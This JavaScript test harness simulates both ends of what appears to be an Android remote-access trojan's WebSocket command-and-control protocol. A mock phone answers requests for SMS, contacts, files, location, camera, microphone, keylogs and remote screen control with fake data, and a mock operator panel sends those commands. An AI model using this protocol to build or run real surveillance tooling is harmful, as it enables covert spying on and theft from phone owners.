const WebSocket = require('ws');

const WS_URL = process.env.WS_URL || 'ws://localhost:8081';
const DEVICE_ID = process.env.DEVICE_ID || `mock-device-${Date.now()}`;
const PING_INTERVAL = 30000;

class MockDevice {
    constructor(deviceId, options = {}) {
        this.deviceId = deviceId;
        this.ws = null;
        this.pingInterval = null;
        this.isConnected = false;
        this.options = {
            phoneName: options.phoneName || 'Mock Device',
            model: options.model || 'Mock Pixel 8',
            androidVersion: options.androidVersion || '14',
            batteryCharge: options.batteryCharge || '85',
            accessibility: options.accessibility || '1',
            country: options.country || 'China',
            userEmail: options.userEmail || 'test@example.com',
            installDate: options.installDate || '2026-01-01',
            ...options,
        };
    }

    connect() {
        return new Promise((resolve, reject) => {
            console.log(`[Device ${this.deviceId}] Connecting to ${WS_URL}...`);
            this.ws = new WebSocket(WS_URL);

            this.ws.on('open', () => {
                console.log(`[Device ${this.deviceId}] Connected`);
                this.isConnected = true;
                this.startPing();
                resolve();
            });

            this.ws.on('message', (data) => {
                this.handleMessage(data.toString());
            });

            this.ws.on('close', () => {
                console.log(`[Device ${this.deviceId}] Disconnected`);
                this.isConnected = false;
                this.stopPing();
            });

            this.ws.on('error', (err) => {
                console.error(`[Device ${this.deviceId}] Error:`, err.message);
                reject(err);
            });
        });
    }

    startPing() {
        this.sendPing();
        this.pingInterval = setInterval(() => this.sendPing(), PING_INTERVAL);
    }

    stopPing() {
        if (this.pingInterval) {
            clearInterval(this.pingInterval);
            this.pingInterval = null;
        }
    }

    sendPing() {
        const deviceInfo = new URLSearchParams({
            phone_id: this.deviceId,
            phone_name: this.options.phoneName,
            model: this.options.model,
            android_version: this.options.androidVersion,
            battery_charge: this.options.batteryCharge,
            accessibility: this.options.accessibility,
            country: this.options.country,
            user_email: this.options.userEmail,
            install_date: this.options.installDate,
        }).toString();

        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'ping',
            msg: deviceInfo,
        });
    }

    handleMessage(rawData) {
        try {
            const msg = JSON.parse(rawData);
            const type = msg.type;
            const subc = msg.subc;

            console.log(`[Device ${this.deviceId}] Received: ${type}/${subc}`);

            if (type === 'screencomd') {
                this.handleScreenCommand(msg);
            } else if (type === 'screen') {
                this.handleScreenControl(msg);
            } else if (type === 'Activitys') {
                this.handleActivityCommand(msg);
            } else if (type === 'Delete') {
                console.log(`[Device ${this.deviceId}] Delete command received`);
            } else if (type === 'Permissions') {
                console.log(`[Device ${this.deviceId}] Permission request: ${msg.prim}`);
            } else if (type === 'proxy') {
                this.handleProxyCommand(msg);
            } else if (type === 'brows') {
                console.log(`[Device ${this.deviceId}] Browser command: ${msg.subc}`);
            } else if (type === 'bc') {
                console.log(`[Device ${this.deviceId}] Broadcast: ${msg.subc} - ${msg.thetitle}`);
            }
        } catch (err) {
            console.error(`[Device ${this.deviceId}] Parse error:`, err.message);
        }
    }

    handleScreenCommand(msg) {
        const subc = msg.subc;
        console.log(`[Device ${this.deviceId}] ScreenCommand: ${subc}`);

        switch (subc) {
            case 'screen':
                this.sendScreenData();
                break;
            case 'SMS':
                this.sendSmsData();
                break;
            case 'Contacts':
                this.sendContactsData();
                break;
            case 'files':
                this.sendFilesData(msg.filepath || '/sdcard');
                break;
            case 'LOADAPPS':
                this.sendAppsData();
                break;
            case 'loc':
                this.sendLocationData();
                break;
            case 'cam':
                this.sendCameraData(msg.SelectedCam);
                break;
            case 'mic':
                this.sendMicData();
                break;
            case 'Keylog':
                this.sendKeylogData(msg.keylogtype);
                break;
            case 'rename':
                this.options.phoneName = msg.nam || this.options.phoneName;
                console.log(`[Device ${this.deviceId}] Renamed to: ${this.options.phoneName}`);
                break;
            case 'out':
                console.log(`[Device ${this.deviceId}] Out command - stopping screen share`);
                break;
            default:
                console.log(`[Device ${this.deviceId}] Unknown screencomd: ${subc}`);
        }
    }

    handleScreenControl(msg) {
        const subc = msg.subc;

        switch (subc) {
            case 'mov':
                console.log(`[Device ${this.deviceId}] Touch: type=${msg.movetype} at ${msg.poi}`);
                break;
            case 'nav':
                console.log(`[Device ${this.deviceId}] Navigation: ${msg.nav}`);
                break;
            case 'snap':
                this.sendScreenshot();
                break;
            case 'vol':
                console.log(`[Device ${this.deviceId}] Volume: ${msg.volstate === '1' ? 'up' : 'down'}`);
                break;
            case 'kb':
                console.log(`[Device ${this.deviceId}] Keyboard: ${msg.kbstate}`);
                break;
            case 'L':
                console.log(`[Device ${this.deviceId}] Lock: ${msg.lock}`);
                break;
            case 'paste':
                console.log(`[Device ${this.deviceId}] Paste: ${msg.txt}`);
                break;
            default:
                console.log(`[Device ${this.deviceId}] Screen control: ${subc}`);
        }
    }

    handleActivityCommand(msg) {
        const subc = msg.subc;
        console.log(`[Device ${this.deviceId}] Activity command: ${subc}`);
    }

    handleProxyCommand(msg) {
        const subc = msg.subc;
        if (subc === '1') {
            console.log(`[Device ${this.deviceId}] Proxy ON`);
            this.send({
                itype: 'Slr_client',
                pid: this.deviceId,
                subc: 'proxy',
                ctype: 'first',
                loip: '192.168.1.100',
                pport: '8888',
            });
        } else {
            console.log(`[Device ${this.deviceId}] Proxy OFF`);
        }
    }

    sendScreenData() {
        const fakeImage = this.generateFakeImage();
        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'screen',
            img: fakeImage,
            wmob: 1080,
            hmob: 1920,
        });
    }

    sendScreenshot() {
        const fakeImage = this.generateFakeImage();
        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'screenshot',
            img: fakeImage,
            wmob: 1080,
            hmob: 1920,
        });
    }

    sendSmsData() {
        const smsData = [
            { address: '10086', body: '您的余额为100元', date: Date.now(), type: 1 },
            { address: '10010', body: '流量已用完', date: Date.now() - 3600000, type: 1 },
            { address: '13800138000', body: '你好，在吗？', date: Date.now() - 7200000, type: 1 },
        ].map(s => JSON.stringify(s)).join('\n');

        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'sms',
            msg: smsData,
        });
    }

    sendContactsData() {
        const contacts = [
            { name: '张三', number: '13800138000' },
            { name: '李四', number: '13900139000' },
            { name: '王五', number: '13700137000' },
        ].map(c => JSON.stringify(c)).join('\n');

        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'loadcontacts',
            msg: contacts,
        });
    }

    sendFilesData(path) {
        const files = 'Documents[>D<]Downloads[>D<]Pictures[>D<]test.txt[>A<]photo.jpg[>A<]video.mp4[>A<]';
        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'files',
            msg: files,
        });
        console.log(`[Device ${this.deviceId}] Sent files for path: ${path}`);
    }

    sendAppsData() {
        const apps = JSON.stringify([
            { name: 'Chrome', package: 'com.android.chrome', icon: '' },
            { name: 'Settings', package: 'com.android.settings', icon: '' },
            { name: 'Camera', package: 'com.android.camera', icon: '' },
            { name: 'Messages', package: 'com.android.mms', icon: '' },
        ]);

        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'loadapps',
            msg: apps,
        });
    }

    sendLocationData() {
        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'loc',
            msg: 'lat=39.9042&lng=116.4074&accuracy=10&provider=gps',
        });
    }

    sendCameraData(camera) {
        const fakeImage = this.generateFakeImage();
        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'cam',
            img: fakeImage,
        });
        console.log(`[Device ${this.deviceId}] Camera data sent (${camera || 'back'})`);
    }

    sendMicData() {
        const fakeAudio = 'UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'mic',
            voip: fakeAudio,
        });
    }

    sendKeylogData(keylogtype) {
        const keylogData = `[2026-01-31 10:00:00] Chrome: hello world
[2026-01-31 10:01:00] Messages: test message
[2026-01-31 10:02:00] Settings: password123`;

        this.send({
            itype: 'Slr_client',
            pid: this.deviceId,
            subc: 'klogs',
            msg: keylogData,
        });
    }

    generateFakeImage() {
        return '/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAB//2Q==';
    }

    send(data) {
        if (this.ws?.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(data));
            console.log(`[Device ${this.deviceId}] Sent: ${data.subc}`);
            return true;
        }
        return false;
    }

    disconnect() {
        this.stopPing();
        if (this.ws) {
            this.ws.close();
            this.ws = null;
        }
    }
}

class MockPanel {
    constructor(options = {}) {
        this.ws = null;
        this.isConnected = false;
        this.subscribedDevice = null;
        this.userEmail = options.userEmail || 'GCt/Suj1maxHZ3aCykJufw==';
        this.messageHandlers = [];
    }

    connect() {
        return new Promise((resolve, reject) => {
            console.log(`[Panel] Connecting to ${WS_URL}...`);
            this.ws = new WebSocket(WS_URL);

            this.ws.on('open', () => {
                console.log(`[Panel] Connected`);
                this.isConnected = true;
                resolve();
            });

            this.ws.on('message', (data) => {
                this.handleMessage(data.toString());
            });

            this.ws.on('close', () => {
                console.log(`[Panel] Disconnected`);
                this.isConnected = false;
            });

            this.ws.on('error', (err) => {
                console.error(`[Panel] Error:`, err.message);
                reject(err);
            });
        });
    }

    handleMessage(rawData) {
        try {
            const msg = JSON.parse(rawData);
            console.log(`[Panel] Received: ${msg.type}`);
            this.messageHandlers.forEach(handler => handler(msg));
        } catch (err) {
            console.error(`[Panel] Parse error:`, err.message);
        }
    }

    onMessage(handler) {
        this.messageHandlers.push(handler);
        return () => {
            this.messageHandlers = this.messageHandlers.filter(h => h !== handler);
        };
    }

    checkPhone(page = 1, pageSize = 100, filters = {}) {
        this.send({
            subc: 'checkphone',
            email: this.userEmail,
            page,
            pageSize,
            filters,
        });
    }

    joinDevice(deviceId) {
        this.subscribedDevice = deviceId;
        this.send({
            itype: 'slr_panel',
            subc: 'join',
            pid: deviceId,
        });
    }

    pingDevice(deviceId) {
        this.send({
            itype: 'slr_panel',
            subc: 'ping',
            pid: deviceId || this.subscribedDevice,
        });
    }

    sendTap(x, y) {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panel',
            subc: 'screen',
            pid: this.subscribedDevice,
            comand: 'mov',
            movetype: '0',
            poi: `${x},${y}`,
        });
    }

    sendSwipe(x1, y1, x2, y2) {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panel',
            subc: 'screen',
            pid: this.subscribedDevice,
            comand: 'mov',
            movetype: '1',
            poi: `${x1},${y1},${x2},${y2}`,
        });
    }

    sendNavigation(nav) {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panel',
            subc: 'screen',
            pid: this.subscribedDevice,
            comand: 'nav',
            navshort: nav,
        });
    }

    requestSms() {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'SMS',
            pid: this.subscribedDevice,
        });
    }

    requestContacts() {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'Contacts',
            pid: this.subscribedDevice,
        });
    }

    requestFiles(filepath = '/sdcard') {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'files',
            pid: this.subscribedDevice,
            filepath,
        });
    }

    requestApps() {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'LOADAPPS',
            pid: this.subscribedDevice,
        });
    }

    requestLocation() {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'loc',
            pid: this.subscribedDevice,
        });
    }

    startScreenShare() {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'screen',
            pid: this.subscribedDevice,
            screentype: 'SK',
        });
    }

    stopScreenShare() {
        if (!this.subscribedDevice) return;
        this.send({
            itype: 'slr_panelsend',
            subc: 'screen',
            pid: this.subscribedDevice,
            screentype: 'SKOFF',
        });
    }

    send(data) {
        if (this.ws?.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(data));
            console.log(`[Panel] Sent: ${data.subc || data.itype}`);
            return true;
        }
        return false;
    }

    disconnect() {
        if (this.ws) {
            this.ws.close();
            this.ws = null;
        }
    }
}

async function runInteractiveMode() {
    const device = new MockDevice(DEVICE_ID);
    
    try {
        await device.connect();
        console.log(`\nMock Device running with ID: ${DEVICE_ID}`);
        console.log('Press Ctrl+C to stop\n');
    } catch (err) {
        console.error('Failed to connect:', err.message);
        process.exit(1);
    }

    process.on('SIGINT', () => {
        console.log('\nShutting down...');
        device.disconnect();
        process.exit(0);
    });
}

if (require.main === module) {
    runInteractiveMode();
}

module.exports = { MockDevice, MockPanel };
